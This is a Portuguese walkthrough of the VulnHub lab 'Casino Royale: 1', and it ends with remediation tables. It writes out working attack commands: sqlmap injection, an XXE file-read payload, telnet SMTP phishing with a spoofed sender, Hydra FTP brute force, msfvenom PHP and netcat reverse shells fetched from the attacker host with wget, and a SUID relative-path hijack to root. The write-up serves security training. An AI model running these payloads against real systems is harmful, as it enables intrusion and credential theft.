# Casino Royale: 1

Quando a casa roda queries SQL sem prepared statements e um CMS vulnerável a CSRF está escondido atrás de um vhost, o jogo está armado a seu favor, mano. Casino Royale: 1 encadeia seis classes de vulnerabilidade distintas em uma máquina temática do universo 007, e cada elo dessa corrente é um achado real que você vai encontrar em ambiente de produção, tá ligado?

---

| Campo | Valor |
|---|---|
| **Nivel** | Dificil |
| **VM Alvo** | Casino Royale: 1 (Linux, 192.168.1.102) |
| **VM Atacante** | Kali Linux 192.168.1.107 |
| **VulnHub URL** | https://www.vulnhub.com/entry/casino-royale-1,287/ |
| **Tecnicas** | SQLi automatizado, CSRF, phishing via SMTP, XXE, brute force FTP, upload de PHP, hijack de SUID por caminho relativo |
| **CVEs / EDBs** | EDB-6766 (PokerMax SQLi), EDB-35301 (Snowfox CMS CSRF) |
| **Grupos APT** | APT41 (exploracao de aplicacoes web + engenharia social), FIN7 (phishing + cadeias de movimentacao lateral) |

---

## Resumo do Ataque

```
[nmap] ---> portas 21 (FTP), 25 (SMTP), 80 (HTTP)
             |
             v
[dirb + searchsploit] ---> /pokeradmin/ (PokerMax, EDB-6766)
             |
             v
[sqlmap --forms] ---> dump pokerleague DB ---> admin:raise12million
             |
             v
[perfis de jogador] ---> vhost casino-royale.local ---> Snowfox CMS
             |
             v
[CSRF EDB-35301] ---> raj.html servido via Apache
             |
             v
[phishing SMTP telnet] ---> valenka@casino-royale.local clica no link
             |
             v
[admin Snowfox] ---> vip-client-portfolios ---> endpoint XML
             |
             v
[payload XXE] ---> /etc/passwd ---> ftpUserULTRA
             |
             v
[Hydra FTP] ---> bankbank ---> upload shell.php5
             |
             v
[Meterpreter] ---> config.php ---> valenka:11archives11!
             |
             v
[su valenka] ---> /opt/casino-royale/mi6_detect_test (SUID)
             |
             v
[hijack run.sh em /tmp] ---> listener nc ---> shell root
```

---

## Metodologia

1. Descoberta de host e servicos com `netdiscover` e `nmap`
2. Brute force de diretorios web revelando o caminho do admin PokerMax
3. Injecao SQL automatizada com SQLMap para obter credenciais de admin
4. Resolucao de vhost e exploracao do Snowfox CMS via PoC publico de CSRF
5. Engenharia social via SMTP para entregar o payload CSRF a um usuario interno
6. Injecao XXE no endpoint XML para vazar `/etc/passwd` e enumerar usuario FTP
7. Brute force FTP com Hydra e upload de reverse shell PHP
8. Movimentacao lateral via `config.php`; escalada de privilegios por hijack de caminho relativo em binario SUID

---

## Passo 1: Descoberta de Host

**Contexto:** A rede do lab e 192.168.1.0/24. O alvo e desconhecido no inicio.

```bash
netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.102

nmap -sV -p- 192.168.1.102
```

**Saida esperada (resumida):**
```
21/tcp  open  ftp     vsftpd 3.0.3
25/tcp  open  smtp    Postfix smtpd
80/tcp  open  http    Apache httpd 2.4.x
```

**Alternativa:** `arp-scan -l` para descoberta mais rapida na mesma sub-rede.

**Nota real:** Tres servicos expostos em um unico host ja e sinal de alerta. FTP + SMTP num servidor web cheira a deploi legado ou configuracao amadora, véi.

**TTP MITRE:** T1046 - Network Service Scanning

---

## Passo 2: Enumeracao Web e Descoberta do PokerMax

**Contexto:** Porta 80 exibe uma pagina generica. Preciso encontrar diretorios ocultos e identificar a aplicacao.

```bash
dirb http://192.168.1.102/
# Encontrado: /index.php, /pokeradmin/

searchsploit poker
# EDB-6766 -- PokerMax Poker League 0.13 SQLi
searchsploit -m 6766
cat 6766.txt
```

O painel admin fica em `/pokeradmin/`. O EDB-6766 confirma que o formulario de login e injetavel.

**Alternativa:** `gobuster dir -u http://192.168.1.102/ -w /usr/share/seclists/Discovery/Web-Content/common.txt`

**Nota real:** Software open-source legado de jogos e CMSes ainda roda em VPS sem patch por ai. Quando o SearchSploit bate antes de voce nem tocar na aplicacao, isso ja e suspeito demais, caramba.

**TTP MITRE:** T1083 - File and Directory Discovery

---

## Passo 3: Injecao SQL com SQLMap

**Contexto:** O formulario de login do PokerMax em `/pokeradmin/index.php` e injetavel via parametro de usuario.

```bash
# Enumerar bancos de dados
sqlmap -u http://192.168.1.102/pokeradmin/index.php \
  --forms --risk 3 --level 5 --dbs --batch

# Dump completo do pokerleague
sqlmap -u http://192.168.1.102/pokeradmin/index.php \
  --forms --risk 3 --level 5 -D pokerleague --dump-all --batch
```

**Saida esperada:**
```
[*] Database: pokerleague
Table: admin
admin_user: admin
admin_password: raise12million
```

**Alternativa:** SQLi manual com `' OR '1'='1` se o sqlmap for bloqueado por WAF.

**Nota real:** SQLi automatizado em formularios de login de producao acontece todo dia. FIN7 literalmente constroiu ferramentas ao redor desse fluxo de trabalho para atacar sistemas de pagamento e e-commerce.

**TTP MITRE:** T1190 - Exploit Public-Facing Application

---

## Passo 4: Descoberta do Snowfox CMS via Perfis de Jogadores

**Contexto:** Logado no admin PokerMax. Os dados dos perfis referenciam um dominio interno.

```bash
echo "192.168.1.102  casino-royale.local" >> /etc/hosts
```

Navegando para `http://casino-royale.local`, uma instancia do Snowfox CMS e exposta.

**Nota real:** Referencias de dominio interno vazando pelos dados da aplicacao e um pivot OSINT classico. Operadores APT usam exatamente esse padrao para mapear infraestrutura interna, mano.

**TTP MITRE:** T1087 - Account Discovery / T1016 - System Network Configuration Discovery

---

## Passo 5: Exploit CSRF para Criar Usuario Admin (EDB-35301)

**Contexto:** O Snowfox CMS tem uma vulnerabilidade CSRF conhecida que permite criar um usuario admin sem autenticacao.

```bash
searchsploit snowfox
searchsploit -m 35301
cp 35301.txt /var/www/html/raj.html
# Editar raj.html: substituir IP do atacante por 192.168.1.107
service apache2 start
```

O payload CSRF em `raj.html` cria um formulario oculto que submete automaticamente e cria uma nova conta admin no Snowfox quando qualquer admin autenticado visita a URL.

**Nota real:** Criacao de conta via CSRF ainda e um vetor relevante em CMSes antigos. Combine com engenharia social e voce tem acesso de admin sem precisar bypassar autenticacao nenhuma, pô.

**TTP MITRE:** T1059.007 - JavaScript (CSRF auto-submit), T1566.002 - Phishing: Spearphishing Link

---

## Passo 6: Phishing SMTP para Entregar Payload CSRF

**Contexto:** Preciso que um usuario autenticado do Snowfox acesse o link CSRF. A usuario interna `valenka` tem conta de email.

```bash
telnet casino-royale.local 25
EHLO attacker
MAIL FROM: admin@casino-royale.local
RCPT TO: valenka@casino-royale.local
DATA
Subject: Atualizacao Importante do Portal

Por favor, acesse o novo portal: http://192.168.1.107/raj.html
.
QUIT
```

Monitorar o hit:

```bash
tail -f /var/log/apache2/access.log
# Aguardar: GET /raj.html HTTP/1.1
```

Quando `valenka` clica no link, o CSRF dispara e cria a conta de admin do atacante. Top demais isso.

**Alternativa:** Se o servidor SMTP exigir autenticacao, tentar credential stuffing com a senha `raise12million`.

**Nota real:** Relays SMTP internos sem autenticacao de remetente ainda sao comuns em ambientes corporativos legados. Atores de BEC usam open relay e enderecos de remetente falsificados para entregar payloads dentro do perimetro corporativo todo dia.

**TTP MITRE:** T1566.002 - Phishing: Spearphishing Link, T1071.003 - Application Layer Protocol: Mail Protocols

---

## Passo 7: Login como Novo Admin e Navegar para o Portal VIP

**Contexto:** O CSRF criou uma conta admin controlada pelo atacante. Fazer login e explorar.

Logar com as credenciais criadas via CSRF (ex.: `user@user.local:password`) no Snowfox CMS. Navegar ate a secao `vip-client-portfolios` para encontrar um novo endpoint que processa XML.

**TTP MITRE:** T1078 - Valid Accounts

---

## Passo 8: Injecao XXE para Ler /etc/passwd

**Contexto:** O endpoint VIP em `/ultra-access-view/main.php` processa dados XML via POST sem filtrar entidades externas. Alvo classico de XXE, véi.

Criar `xml.txt`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><user>&xxe;</user></root>
```

Enviar o payload:

```bash
curl -d @xml.txt http://casino-royale.local/ultra-access-view/main.php
```

**Saida esperada (trecho):**
```
root:x:0:0:root:/root:/bin/bash
...
ftpUserULTRA:x:1001:1001::/home/ftpUserULTRA:/bin/bash
```

Usuario descoberto: **ftpUserULTRA**

**Alternativa:** Tentar `file:///etc/shadow` ou `file:///var/www/html/config.php` para dados mais sensiveis.

**Nota real:** XXE ficou no OWASP Top 10 por anos e ainda aparece em codigo legado de processamento XML. APIs de saude e sistemas financeiros sao os principais offenders em engajamentos reais.

**TTP MITRE:** T1190 - Exploit Public-Facing Application, T1552.001 - Credentials in Files

---

## Passo 9: Brute Force FTP com Hydra

**Contexto:** FTP aberto na porta 21. Usuario `ftpUserULTRA` confirmado via XXE. Hora de forcar a senha, mano.

```bash
hydra -l ftpUserULTRA -P /usr/share/wordlists/rockyou.txt \
  ftp://192.168.1.102
```

**Saida esperada:**
```
[21][ftp] host: 192.168.1.102   login: ftpUserULTRA   password: bankbank
```

**Nota real:** Senhas curtas de dicionario em contas FTP legadas ainda sao prevalentes em sistemas embarcados e hospedagem web antiga. Hydra contra FTP e uma das primeiras ferramentas usadas em pentest de movimentacao lateral.

**TTP MITRE:** T1110.003 - Brute Force: Password Spraying

---

## Passo 10: Upload de Reverse Shell PHP via FTP

**Contexto:** Acesso FTP autenticado. Fazer upload de uma reverse shell PHP para o diretorio web.

Gerar o payload:

```bash
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.107 LPORT=443 -f raw > shell.php5
```

Upload via FTP:

```bash
ftp 192.168.1.102
# Login: ftpUserULTRA / bankbank
ftp> put shell.php5
ftp> chmod 777 shell.php5
ftp> bye
```

Iniciar o handler:

```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.107
set LPORT 443
exploit
```

Navegar para a URL da shell para disparar a execucao. Sessao Meterpreter aberta. Isso ai!

**Alternativa:** Upload da shell pentestmonkey PHP e capturar com `nc -lvnp 443` sem usar o Metasploit.

**Nota real:** Diretorios FTP com permissao de escrita apontando para o webroot e uma misconfiguracao critica. Atacantes usam exatamente essa cadeia (upload FTP + trigger web) em campanhas de acesso inicial de ransomware.

**TTP MITRE:** T1505.003 - Web Shell, T1021 - Remote Services

---

## Passo 11: Estabilizar Shell e Movimentacao Lateral

**Contexto:** Shell rodando como conta de servico web/FTP. Credenciais de `valenka` estao num arquivo PHP de configuracao.

```bash
python -c "import pty; pty.spawn('/bin/bash')"

cat /var/www/html/config.php
# valenka:11archives11!

su valenka
# Senha: 11archives11!
id
# uid=1000(valenka)
```

**Nota real:** Credenciais em texto puro em arquivos PHP de configuracao sao o pao com manteiga do pentest de app web. Isso mostra por que secret scanning em pipelines CI/CD e tao importante, tá ligado?

**TTP MITRE:** T1552.001 - Unsecured Credentials: Credentials in Files, T1078 - Valid Accounts

---

## Passo 12: Escalada de Privilegios via Hijack de Binario SUID por Caminho Relativo

**Contexto:** Usuario `valenka` tem acesso a um binario SUID customizado que executa `run.sh` usando um caminho relativo. Setup classico de hijack, véi.

```bash
find / -perm -4000 2>/dev/null
# /opt/casino-royale/mi6_detect_test
```

O binario chama `run.sh` sem caminho absoluto. Colocar um `run.sh` malicioso no diretorio de trabalho atual faz o binario SUID executar como root.

Gerar o payload no atacante:

```bash
msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.1.107 LPORT=1234 \
  -f raw > run.sh
python3 -m http.server 8080
```

No alvo:

```bash
cd /tmp
wget http://192.168.1.107:8080/run.sh
chmod +x run.sh

# Iniciar listener no atacante primeiro
nc -lvp 1234

# Disparar o binario SUID a partir de /tmp
/opt/casino-royale/mi6_detect_test
```

Shell root chega no listener. GG, tomou um vacilo feio.

**Alternativa:** Manipulacao da variavel PATH em vez de drop de arquivo: `export PATH=/tmp:$PATH` e colocar `run.sh` em `/tmp`.

**Nota real:** Execucao de caminho relativo em binarios SUID/SGID e um achado classico de privesc no Linux. Aparece regularmente em relatorios de auditoria de sistemas embarcados, software enterprise legado e scripts customizados deploiados sem revisao de seguranca.

**TTP MITRE:** T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid, T1574.007 - Hijack Execution Flow: Path Interception by PATH Environment Variable

---

## Passo 13: Flag Root

```bash
whoami
# root
cd /root
ls
cat flag.sh
```

Flag capturada. Missao cumprida. Chacoalhado, nao mexido.

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Fonte |
|---|---|---|
| Credenciais admin PokerMax | `admin:raise12million` | Dump SQLMap do banco `pokerleague` |
| Usuario FTP | `ftpUserULTRA` | /etc/passwd via XXE |
| Senha FTP | `bankbank` | Brute force Hydra (rockyou) |
| Credenciais movimentacao lateral | `valenka:11archives11!` | /var/www/html/config.php |
| Flag root | Ver /root/flag.sh | Hijack de binario SUID |

---

## Licoes Aprendidas

| Achado | Impacto | Relevancia no Mundo Real |
|---|---|---|
| Injecao SQL no login legado do PokerMax | Dump de credenciais admin, acesso total ao backend | Apps open-source legados sem patch rodando em producao sao endemicos em ambientes PME |
| CSRF no Snowfox CMS (EDB-35301) | Criacao de conta admin sem autenticacao | Combinado com engenharia social, CSRF bypassa autenticacao completamente sem um unico brute force |
| Open relay SMTP e engenharia social | Entrega de payload para usuarios internos | Atores de BEC usam open relays e remetentes falsificados para entregar payloads dentro do perimetro corporativo |
| Injecao XXE no endpoint XML | Exfiltracao de /etc/passwd e enumeracao de usuarios | XXE ainda aparece em APIs de saude, sistemas financeiros e middleware enterprise que processam XML sem desabilitar expansao de entidades |
| FTP com escrita no webroot | Upload de shell PHP e RCE | Acesso FTP ao webroot e uma misconfiguracao critica vista em hospedagem compartilhada e deplois legados |
| Binario SUID com execucao por caminho relativo | Escalada trivial de privilegios para root | Audite todo binario SUID customizado em producao; execucao por caminho relativo significa que qualquer diretorio gravavel vira vetor de privesc |

---

## Mapeamento MITRE ATT&CK

| Tecnica | ID | Tatica |
|---|---|---|
| Exploit Public-Facing Application | T1190 | Initial Access |
| Phishing: Spearphishing Link | T1566.002 | Initial Access |
| Valid Accounts | T1078 | Persistence / Lateral Movement |
| Command and Scripting Interpreter: Unix Shell | T1059.004 | Execution |
| Application Layer Protocol: Mail Protocols | T1071.003 | Command and Control |
| Network Service Scanning | T1046 | Discovery |
| File and Directory Discovery | T1083 | Discovery |
| Brute Force: Password Spraying | T1110.003 | Credential Access |
| Unsecured Credentials: Credentials in Files | T1552.001 | Credential Access |
| Web Shell | T1505.003 | Persistence |
| Remote Services: FTP | T1021 | Lateral Movement |
| Abuse Elevation Control Mechanism: Setuid and Setgid | T1548.001 | Privilege Escalation |
| Hijack Execution Flow: Path Interception by PATH | T1574.007 | Privilege Escalation |

---

## Remediacao

### NIST CSF 2.0

| Funcao | Controle | Acao |
|---|---|---|
| PR.DS-1 | Protecao de Dados em Repouso | Criptografar credenciais em repouso; nunca armazenar senhas em texto puro em arquivos de configuracao |
| PR.AC-3 | Gerenciamento de Acesso Remoto | Restringir acesso FTP a usuarios autenticados e autorizados; preferir SFTP |
| DE.CM-8 | Monitoramento de Vulnerabilidades | Executar varreduras de vulnerabilidade autenticadas mensalmente para detectar CVEs de apps legados |
| ID.AM-2 | Gerenciamento de Ativos de Software | Manter SBOM para todas as aplicacoes web deploiadas; sinalizar softwares em fim de vida |

### NIST SP 800-53

| Controle | Descricao |
|---|---|
| SI-10 | Validacao de Entrada de Informacoes (parametrizar queries SQL; desabilitar entidades externas XML) |
| AC-17 | Acesso Remoto (restringir FTP/SMTP a fontes confiadas; impor autenticacao) |
| SI-3 | Protecao contra Codigo Malicioso (bloquear execucao PHP em diretorios de upload) |
| CM-7 | Funcionalidade Minima (desabilitar open relay SMTP; remover servicos nao utilizados) |
| SC-28 | Protecao de Informacoes em Repouso (criptografar arquivos de configuracao com gerenciamento de segredos) |

### CISA KEV

Processamento de entidades externas XML (XXE), injecao SQL em formularios de login e CSRF em plataformas CMS legadas sao todos documentados no catalogo de assessorias da CISA. Nenhum ID KEV especifico atribuido a esses alvos PoC legados, mas as classes de vulnerabilidade sao rastreadas no catalogo de Vulnerabilidades Conhecidas Exploradas da CISA para CVEs relacionados em produtos similares.

### C2M2 (Cybersecurity Capability Maturity Model)

| Dominio | Maturidade Atual | Maturidade Alvo | Lacuna |
|---|---|---|---|
| Gerenciamento de Ativos e Configuracoes | MIL0 (sem inventario de apps deploiadas) | MIL2 | Implementar CMDB; rastrear software em EOL |
| Gerenciamento de Ameacas e Vulnerabilidades | MIL0 (sem varredura) | MIL2 | Varreduras mensais; SLA de patch para achados criticos |
| Gerenciamento de Identidade e Acesso | MIL0 (sem MFA, senhas fracas) | MIL2 | Impor MFA; politica de senha; RBAC |

### MITRE D3FEND

| Tecnica D3FEND | ID | Endereca |
|---|---|---|
| File Content Policies | D3-FCOP | Bloquear execucao PHP em diretorios de upload |
| Network Traffic Filtering | D3-NTF | Bloquear FTP de fontes nao confiadas |
| Process Spawn Analysis | D3-PSA | Detectar binarios SUID gerando processos filhos inesperados |
| Database Query String Analysis | D3-DQSA | Detectar padroes de injecao SQL em query strings |

---

## Consideracoes Finais

Casino Royale: 1 e uma aula magistral de como encadear achados de baixa a media severidade em um comprometimento total de root. Nenhuma vulnerabilidade isolada e catastrofica: SQLi entrega credenciais, CSRF entrega uma segunda conta admin, XXE entrega um nome de usuario, brute force entrega uma senha, e o binario SUID amarra tudo. Ambientes reais estao cheios dessas cadeias, mano.

O passo de phishing SMTP e particularmente interessante porque demonstra que engenharia social nao exige ferramentas sofisticadas: uma sessao telnet e um open relay sao suficientes para entregar um payload a um usuario interno. Defensores que focam exclusivamente em controles de perimetro enquanto deixam a infraestrutura interna de email mal configurada vao tomar um vacilo feio com essa cadeia toda vez.

Thanks guys!! (❍ᴥ❍ʋ)
